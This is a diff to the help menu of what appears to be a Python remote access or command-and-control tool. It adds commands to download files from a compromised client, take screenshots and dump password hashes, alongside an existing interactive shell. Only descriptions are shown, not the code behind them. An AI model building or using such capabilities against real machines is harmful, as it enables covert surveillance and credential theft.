@@ -6,13 +6,21 @@ import pyfiglet
 
 def print_help_client():
     commands = {
-        "exit": {
+        "help": {
+            "description": "Display this help message.",
+            "usage": "help"
+        },
+        "close": {
             "description": "Close the client connection.",
-            "usage": "exit"
+            "usage": "close"
         },
         "upload": {
             "description": "Upload a file from the server to the client.",
             "usage": "upload <file_path>"
+        },
+        "download": {
+            "description": "Download a file from the client to the server.",
+            "usage": "download <file_path>"
         },
         "shell": {
             "description": "Open an interactive shell to execute commands on the client.",
@@ -30,9 +38,21 @@ def print_help_client():
             "description": "List files and directories in the client's current directory.",
             "usage": "ls"
         },
+        "pwd": {
+            "description": "Display the current working directory on the client.",
+            "usage": "pwd"
+        },
         "search": {
             "description": "Search any file in client file system",
             "usage": "seach <file path>"
+        },
+        "screenshot": {
+            "description": "Take a screenshot of the client's screen.",
+            "usage": "screenshot"
+        },
+        "hashdump": {
+            "description": "Dump the file password hashes from the client.",
+            "usage": "hashdump"
         }
     }
 
@@ -42,7 +62,7 @@ def print_help_client():
 def print_help_manager():
     commands = {
         "exit": {
-            "description": "Close the server or disconnect from a session.",
+            "description": "Close the server or disconnect every clients.",
             "usage": "exit"
         },
         "list": {
